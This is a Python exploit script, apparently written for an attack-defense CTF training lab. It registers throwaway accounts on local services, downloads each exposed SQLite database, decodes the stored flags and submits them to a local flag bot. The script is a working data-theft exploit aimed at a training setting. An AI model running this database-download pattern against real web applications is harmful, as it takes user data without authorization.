import requests
import sqlite3 
import socket
import base64
import os


# Список URL-ов для запросов 
urls = [f"http://localhost:1200{i}" for i in range(1, 6)]


# Registration params [/register]: username, password, password_confirm 
def register_user(url, session):
	creds_login = "hacker-" + str(os.urandom(8).hex())
	creds_passwd = os.urandom(8).hex()
	print("\033[32m[+] User's credentials:", creds_login, creds_passwd, "\033[0m")
	uri = "/register"
	register_resp = session.post(url + uri, data={
			"username": creds_login,
			"password": creds_passwd,
			"password_confirm": creds_passwd,
		})
	if register_resp.status_code == 200:
		print("\033[32m[+] User created successfully!:", register_resp.status_code, register_resp.text, "\033[0m")
		return creds_login, creds_passwd
	else:
		print("\033[31m[-] No register! Error!", register_resp.status_code, "\033[0m")
		return 0


# Registration params [/login]: username, password
def login_user(url, username, passwd, session):
	uri = "/login"
	login_resp = session.post(url + uri, data={
			"username": username,
			"password": passwd
		})
	if login_resp.status_code == 200:
		print(f"\033[32m[+] Login successfully with creds: {username}, {passwd} on {url}, {login_resp.text}\033[0m")
		cookies = login_resp.cookies.get_dict()
		return cookies
	else:
		return "\033[31m[-] Error login...!\033[0m"


# Registration params [/db.sqlite3]: need session cookie
def get_db(url, session, cookies):
	uri = "/db.sqlite3"
	get_db_resp = session.get(url + uri, cookies=cookies)

	if get_db_resp.status_code == 200:
		with open(f"D:/Projects/AD-Exploitation-Training/exploits/service02/databases/localhost-{url[-5:]}.db", "wb") as db_file:
			db_file.write(get_db_resp.content)
		print(f"\033[32m[+] Status: OK, file {url} was saved!\033[0m")
		return url[-5:]
	else:
		print(f"\033[31m[-] Status: Error, the server returned this status code - {url}, {get_db_resp.status_code}!\033[0m\n")
		return 0


# Database parser
def parsing_db(filename):
	# Подключаемся к файлу с БД
	conn = sqlite3.connect(f"D:/Projects/AD-Exploitation-Training/exploits/service02/databases/{filename}")
	flags_list = []
	try:
		# Реализуем запрос на получение данных из таблицы post, где должны храниться флаги
		results = conn.execute("SELECT * FROM flags")
		# Парсим флаги и заносим их в отдельных массив, который возвращаем в качестве результата работы функции
		for row in results.fetchall():
			flags_list.append(base64.b64decode(row[1][2:-1]).decode("utf-8"))

		# decoded_strings = [base64.b64decode(s[2:-1]).decode('utf-8') for s in массив]
		print(f"\033[32m[+] Successfully parsed DB: {flags_list}\033[0m\n")
		return flags_list
	except Exception as err:
		return f"\033[31m[-] Error: {err}\033[0m"
	return 0


# Sending flag to the Flagbot
def sending_flag(flags):
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
		s.connect(('localhost', 1337))
		for flag in flags:
			print(f"\033[96m[+] Flag: {flag}\033[0m")
			s.send((flag + "\n").encode('utf-8'))
			return f"\033[92m[+] Flagbot answer: {s.recv(256)}\033[0m\n"


if __name__ == "__main__":
	for i in range(len(urls)):
		session = requests.Session()
		user_creds = register_user(urls[i], session)
		if user_creds != 0:
			user_login = login_user(urls[i], user_creds[0], user_creds[1], session)
			db = get_db(urls[i], session, user_login)
			flags = parsing_db(f"localhost-{db}.db")
			# print("[------]:", flags)
			for i in range(len(flags)):
				flagbot_answer = sending_flag(flags)
				print(flagbot_answer)
		session.close()